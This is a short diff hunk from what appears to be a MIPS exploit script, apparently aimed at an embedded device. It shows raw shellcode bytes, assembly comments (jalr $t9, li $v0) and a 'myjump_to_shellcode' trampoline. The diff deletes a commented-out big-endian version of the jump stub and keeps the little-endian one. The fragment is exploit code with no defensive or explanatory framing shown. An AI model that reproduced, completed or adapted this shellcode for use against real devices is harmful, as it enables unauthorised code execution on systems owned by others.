@@ -46,10 +46,6 @@ shellcode += b"\xab\x0f\x02\x24\x0c\x09\x09\x01"
     jalr $t9
     li $v0,0xfffffffc
 """
-# myjump_to_shellcode  = b"\x27\xb9\x07\x50"
-# myjump_to_shellcode += b"\x03\x20\xf8\x09"
-# myjump_to_shellcode += b"\x24\x02\xff\xfc"
-
 myjump_to_shellcode  = b"\x04\x01\xb9\x27"
 myjump_to_shellcode += b"\x09\xf8\x20\x03"
 myjump_to_shellcode += b"\xfc\xff\x02\x24"
